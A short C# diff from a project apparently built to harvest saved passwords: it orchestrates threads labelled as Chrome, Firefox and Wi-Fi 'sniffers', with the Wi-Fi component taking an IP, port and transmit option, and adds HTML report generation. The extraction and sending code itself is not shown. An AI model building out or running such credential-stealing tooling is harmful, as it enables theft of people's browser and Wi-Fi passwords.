@@ -4,6 +4,7 @@ using System.Threading;
 using PS03.CommandLineOptions;
 using PS03.Network.Receive;
 using PS03.PasswordOps;
+using PS03.PostOp;
 
 namespace PS03
 {
@@ -42,7 +43,7 @@ namespace PS03
 
                 Thread T_FIREFOX = null;
                 Thread T_CHROME = null;
-
+                Console.WriteLine("Starting sniffers...");
                 var wifi = new GetWifi(options.Ip, options.Port, options.Transmit, options.Verbose);
                 if (chromeexist)
                 {
@@ -59,11 +60,18 @@ namespace PS03
                 }
 
                 var T_WIFI = new Thread(wifi.Execute);
+
                 T_WIFI.Start();
 
                 T_WIFI.Join();
-                T_CHROME.Join();
-                T_FIREFOX.Join();
+                if(chromeexist)
+                    T_CHROME.Join();
+                if(fireexists)
+                    T_FIREFOX.Join();
+                Console.WriteLine("Sniffing done.. Generating report.");
+                var RepGen = DataCounter.Instance.ReportGenerator;
+                RepGen.HTML();
+                Console.WriteLine("Success!");
             }
             if (options.Receive)
             {
